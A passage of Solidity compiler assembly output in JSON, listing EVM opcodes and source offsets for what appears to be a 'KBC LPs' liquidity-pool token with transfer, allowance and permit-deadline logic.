											"value": "FF"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP3"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "AND"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "C0"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH [tag]",
											"value": "60"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "tag",
											"value": "58"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMPDEST"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "STOP"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMPDEST"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "62"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "62"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "ADD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "4B4243204C5073"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "C8"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2877,
											"end": 2881,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 2902,
											"end": 2912,
											"name": "CALLER"
										},
										{
											"begin": 2914,
											"end": 2921,
											"name": "DUP5"
										},
										{
											"begin": 2923,
											"end": 2928,
											"name": "DUP5"
										},
										{
											"begin": 2893,
											"end": 2901,
											"name": "PUSH [tag]",
											"value": "66"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "tag",
											"value": "65"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 2946,
											"end": 2950,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "64"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP3"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "POP"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "POP"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "tag",
											"value": "30"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SLOAD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP2"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "tag",
											"value": "33"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP4"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "AND"
										},
										{
											"begin": 3219,
											"end": 3223,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "SWAP1"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP2"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3248,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "SWAP1"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP2"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP1"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP4"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "KECCAK256"
										},
										{
											"begin": 3255,
											"end": 3265,
											"name": "CALLER"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "DUP5"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "SWAP1"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "SWAP2"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "DUP2"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "KECCAK256"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 3239,
											"end": 3281,
											"name": "EQ"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "PUSH [tag]",
											"value": "68"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP5"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "AND"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP2"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3336,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP2"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP1"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP4"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "KECCAK256"
										},
										{
											"begin": 3343,
											"end": 3353,
											"name": "CALLER"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "DUP5"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SWAP2"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "KECCAK256"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SLOAD"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "PUSH [tag]",
											"value": "69"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "SWAP1"
										},
										{
											"begin": 3376,
											"end": 3381,
											"name": "DUP4"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3327,
											"end": 3358,
											"name": "PUSH [tag]",
											"value": "70"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "AND"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "tag",
											"value": "69"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP6"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "AND"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP2"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3306,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP2"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP1"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP4"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "KECCAK256"
										},
										{
											"begin": 3313,
											"end": 3323,
											"name": "CALLER"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "DUP5"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "SWAP2"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "KECCAK256"
										},
										{
											"begin": 3297,
											"end": 3395,
											"name": "SSTORE"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "tag",
											"value": "68"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "JUMPDEST"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "PUSH [tag]",
											"value": "71"
										},
										{
											"begin": 3425,
											"end": 3429,
											"name": "DUP5"
										},
										{
											"begin": 3431,
											"end": 3433,
											"name": "DUP5"
										},
										{
											"begin": 3435,
											"end": 3440,
											"name": "DUP5"
										},
										{
											"begin": 3415,
											"end": 3424,
											"name": "PUSH [tag]",
											"value": "72"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "tag",
											"value": "71"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 3458,
											"end": 3462,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP4"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP3"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "POP"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "POP"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "POP"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "tag",
											"value": "35"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMPDEST"
										},
										{
											"begin": 706,
											"end": 772,
											"name": "PUSH",
											"value": "6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "DUP2"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "tag",
											"value": "37"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMPDEST"
										},
										{
											"begin": 299,
											"end": 301,
											"name": "PUSH",
											"value": "12"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "tag",
											"value": "39"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMPDEST"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "SLOAD"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "DUP2"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "tag",
											"value": "42"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMPDEST"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "MSTORE"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SWAP1"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "DUP2"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "MSTORE"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SWAP1"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "KECCAK256"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SLOAD"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "DUP2"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "tag",
											"value": "45"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMPDEST"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "MSTORE"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SWAP1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "DUP2"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "MSTORE"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SWAP1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "KECCAK256"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SLOAD"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "DUP2"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "tag",
											"value": "48"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMPDEST"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "MSTORE"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SWAP1"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "DUP2"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "MSTORE"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SWAP1"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "KECCAK256"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SLOAD"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "DUP2"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "tag",
											"value": "50"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMPDEST"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MLOAD"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP1"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "ADD"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MSTORE"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP1"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MSTORE"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "ADD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "4B42432D4C5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "D4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MSTORE"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "POP"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "tag",
											"value": "57"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "JUMPDEST"
										},
										{
											"begin": 3026,
											"end": 3030,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3042,
											"end": 3074,
											"name": "PUSH [tag]",
											"value": "65"
										},
										{
											"begin": 3052,
											"end": 3062,
											"name": "CALLER"
										},
										{
											"begin": 3064,
											"end": 3066,
											"name": "DUP5"
										},
										{
											"begin": 3068,
											"end": 3073,
											"name": "DUP5"
										},
										{
											"begin": 3042,
											"end": 3051,
											"name": "PUSH [tag]",
											"value": "72"
										},
										{
											"begin": 3042,
											"end": 3074,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "tag",
											"value": "60"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMPDEST"
										},
										{
											"begin": 3688,
											"end": 3703,
											"name": "TIMESTAMP"
										},
										{
											"begin": 3676,
											"end": 3684,
											"name": "DUP5"
										},
										{
											"begin": 3676,
											"end": 3703,
											"name": "LT"
										},
										{
											"begin": 3676,
											"end": 3703,
											"name": "ISZERO"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH [tag]",
											"value": "76"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "JUMPI"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP2"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP3"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP3"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E8811561412549151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "82"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP3"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MSTORE"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "MLOAD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "DUP2"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SUB"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "ADD"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "SWAP1"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "REVERT"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "tag",
											"value": "76"
										},
										{
											"begin": 3668,
											"end": 3724,
											"name": "JUMPDEST"
										},
										{
											"begin": 3836,
											"end": 3852,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3836,
											"end": 3852,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP10"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "AND"
										},
										{
											"begin": 3734,
											"end": 3748,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP2"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP2"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "MSTORE"
										},
										{
											"begin": 4073,
											"end": 4079,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "SWAP1"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP2"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "MSTORE"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "DUP4"
										},
										{
											"begin": 4073,
											"end": 4086,
											"name": "KECCAK256"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SLOAD"
										},
										{
											"begin": 4073,
											"end": 4088,
